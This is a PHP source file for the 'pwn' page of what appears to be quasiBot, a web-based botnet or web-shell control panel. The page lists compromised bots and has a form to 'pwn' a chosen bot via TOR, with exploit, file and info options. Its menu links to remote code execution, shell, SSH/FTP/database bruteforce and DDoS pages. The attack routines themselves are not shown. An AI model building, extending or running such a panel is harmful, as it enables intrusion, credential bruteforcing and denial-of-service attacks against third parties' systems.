<?php

require('../config.php');
auth();

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">


<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>quasiBot | pwn</title>
    <link href="../style.css" rel="stylesheet" type="text/css" media="screen" />
</head>
<body>
<div id="wrapper">
    <div id="header">


        <div id="logo">
            <h1><a href="../index.php">&nbsp; &nbsp; &nbsp;<?php echo date('H:i:s') ?></a></h1>

<?php
quotes();
?>

        </div>
    </div>
    <div id="menu">
        <ul>
            <li class="txt_left"><?php echo $_SERVER['DOCUMENT_ROOT'] ?></li>
            <li class="txt_left"><?php echo $_SERVER['PHP_SELF'] ?></li>
            <li class="txt_center"><?php echo date("d.m.y"); ?></li>
            <li class="txt_right"><?php echo $_SERVER['SERVER_ADDR'] ?></li>
            <li class="txt_right"><?php echo $_SERVER['SERVER_NAME'] ?></li>
            <li class="txt_right"><?php echo conn('http://bot.whatismyipaddress.com/') ?></li>
        </ul>
    </div>
    <div id="page">
        <div id="page-bgtop">
            <div id="page-bgbtm">
                <div id="content">

                    <div class="post">
                        <h2 class="title"><a href="#">Bots</a></h2>
                        <div class="entry">
                            <p class="meta">
                            <?php
                            checkbots();
                            ?>
                            </p>
                        </div>
                    </div>
                    <div class="post">
                        <h2 class="title"><a href="#">Pwn</a></h2>
                        <div class="entry">
                        <p class="meta">
                        Pwn &nbsp;&bull;&nbsp; via TOR
                        </p>
                        
                        <table>
                        <tr><form method="post">
                        <td><b>ID</b></td></tr>
                        <tr>
                        <td>
                            <?php
                             echo "<input type=\"text\" style=\"width: 50px;\" value=\"". (empty($_GET['id'])?"0":htmlspecialchars($_GET['id'])) ."\" name=\"id\"></td>&nbsp;";
                            ?>
                        <td style="text-align: left;">
                            <input type="radio" name="os" value="linux" checked> Linux<br/>
                            <input type="radio" name="os" value="win" disabled="disabled"> Windows<br />
                        </td>
                        <td style="text-align: left;"><input type="checkbox" name="info" value="yes"> Info<br />
                        <input type="checkbox" name="exploit" value="yes"> Exploits<br />
                        <input type="checkbox" name="files" value="yes"> Files<br />
                        <input type="checkbox" name="misc" value="yes"> Misc<br /></td>
                        <td><input type="submit" value="Pwn"></td>
                        </form>
                        </tr>
                        </table>  


                        <?php

                        pwn();

                        ?>

                    </div>
                    </div>

                    <div style="clear: both;">&nbsp;</div>
                </div>
                <div id="sidebar">
                    <ul>
                        <li>
                            <h2>Home</h2>
                            <ul>
                                <li><a href="../home/index.php">Index</a></li>
                                <li><a href="../home/settings.php">Settings</a></li>
                                <li><a href="../home/rss.php">RSS</a></li>
                            </ul>
                        </li>
                        <li>
                           <h2>Hack</h2>
                            <ul>
                                <li><a href="rce.php">RCE</a></li>
                                <li><a href="scan.php">Scan</a></li>
                                <li><a href="pwn.php"><b>Pwn</b></a></li>
                                <li><a href="shell.php">Shell</a></li>
                            </ul>
                        </li>
                        <li>
                           <h2>Bruteforce</h2>
                            <ul>
                                <li><a href="../bf/ssh.php">SSH</a></li>
                                <li><a href="../bf/ftp.php">FTP</a></li>
                                <li><a href="../bf/dbs.php">DB's</a></li>
                                <li><a href="../bf/www.php">WWW</a></li>
                            </ul>
                        </li>
                        <li>
                           <h2>Tools</h2>
                            <ul>
                                <li><a href="../tools/sql.php">MySQL Manager</a></li>
                                <li><a href="../tools/hostscan.php">HostScan</a></li>
                             </ul>
                        </li>
                        <li>
                           <h2>Bots</h2>
                            <ul>
                                <li><a href="ddos.php">DDoS</a></li>
                                <li><a href="more.php">Run</a></li>
                             </ul>
                        </li>
                </div>
                <div style="clear: both;">&nbsp;</div>
            </div>
        </div>
    </div>
</div>
<div id="footer">
    <p><?php echo $_SERVER['SERVER_SOFTWARE']; echo '  -  '; echo $_SERVER['HTTP_USER_AGENT'] ?></p>
</div>
</body>
</html>
